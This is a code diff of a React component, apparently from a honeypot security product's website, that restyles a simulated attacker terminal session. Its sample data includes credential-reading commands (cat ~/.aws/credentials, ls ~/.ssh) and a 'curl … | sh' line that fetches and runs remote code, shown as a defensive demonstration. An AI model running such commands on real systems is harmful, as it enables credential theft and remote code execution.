@@ -3,18 +3,19 @@
 import { Brain, Cube, ShieldSlash, Flask } from "@phosphor-icons/react";
 import { FeedList } from "@/components/shared/FeedList";
 import { NetworkTopology } from "@/components/visualization/NetworkTopology";
+import { cn } from "@/lib/utils";
 
 const SESSION = [
   { id: "1", cmd: "whoami", out: "www-data" },
   { id: "2", cmd: "cat /etc/passwd | tail -n 3", out: "postgres:x:999:999::/var/lib/postgresql:/bin/bash" },
   { id: "3", cmd: "ls ~/.ssh", out: "id_rsa  id_rsa.pub  known_hosts" },
-  { id: "4", cmd: "cat ~/.aws/credentials", out: "[default]\naws_access_key_id = AKIA2E4XQ7...", suspicious: true },
+  { id: "4", cmd: "cat ~/.aws/credentials", out: "[default]\naws_access_key_id = AKIA2E4XQ7…", suspicious: true },
   { id: "5", cmd: "curl -s http://185.220.101.3/x | sh", out: "sh: 1: Syntax error: end of file unexpected", suspicious: true },
 ];
 
 function Block({ icon: IconComponent, title, body, children, className = "" }: { icon: typeof Brain; title: string; body: string; children?: React.ReactNode; className?: string }) {
   return (
-    <div className={`flex flex-col rounded-panel border bg-surface ${className}`}>
+    <div className={`flex min-w-0 flex-col rounded-panel border bg-surface ${className}`}>
       <div className="flex flex-col gap-3 p-7">
         <IconComponent size={24} weight="duotone" className="text-accent" aria-hidden="true" />
         <h3 className="text-lg font-medium text-ink">{title}</h3>
@@ -69,9 +70,9 @@ export function Capabilities() {
                   <div className="py-1">
                     <div className="flex gap-2">
                       <span className="shrink-0 text-success">www-data@honey-web-01:~$</span>
-                      <span className={s.suspicious ? "text-danger" : "text-ink"}>{s.cmd}</span>
+                      <span className={cn("min-w-0 break-all", s.suspicious ? "text-danger" : "text-ink")}>{s.cmd}</span>
                     </div>
-                    <div className="pl-4 whitespace-pre-wrap text-ink-muted">{s.out}</div>
+                    <div className="pl-4 break-all whitespace-pre-wrap text-ink-muted">{s.out}</div>
                   </div>
                 )}
               />
